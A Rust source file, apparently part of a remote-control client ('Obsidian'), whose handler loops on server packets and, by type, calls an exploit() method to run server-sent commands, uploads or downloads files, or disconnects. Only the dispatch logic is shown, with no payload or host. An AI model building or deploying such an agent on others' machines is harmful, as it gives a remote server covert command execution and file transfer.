use crate::{
    Application::client::utils::Obsidian,
    stprotocol::{
        utils::{
            Handlers,
            HandleProtocols,
            PacketProcessing
        }
    },
    structure::{
        utils::{
            enums::{
                StoneTransferProtocol,
                Packet
            },
            traits::Detector,
        }
    }
};

pub mod utils;
pub mod obsidian;

impl Handlers for Obsidian {
    fn default_client_handler(&mut self) {
        loop {
            // 새션 생성후 서버와 지속적인 통신을 위한 루프문
            let packet = self.receiving();

            println!("recv: ");
            packet.display();

            println!("send: ");
            match packet.get_type() {
                StoneTransferProtocol::Connection => {
                    println!("Connection OK");
                    self.session.get_packet()
                }
                // 서버의 응답 타입을 비교하여 보낼 요청을 생성함
                StoneTransferProtocol::ExecuteCmd =>
                // 타입이 ExecuteCmd 일 경우
                    self.exploit().unwrap(),

                StoneTransferProtocol::Download =>
                // 타입이 Download 일 경우
                    self.upload().unwrap(),

                StoneTransferProtocol::Upload =>
                // 타입이 Upload 일 경우
                    self.download().unwrap(),

                StoneTransferProtocol::Disconnect => {
                    self.disconnect();
                    break;
                } // 만약 서버의 응답이 Disconnect 일 경우 연결을 종료한다

                _ => {
                    self.send(Packet::Default).unwrap()
                }, //만약 위의 응답 타입을 제외한 응답을 보낼경우 기본응답 전송
            }.display()

        }
    }
}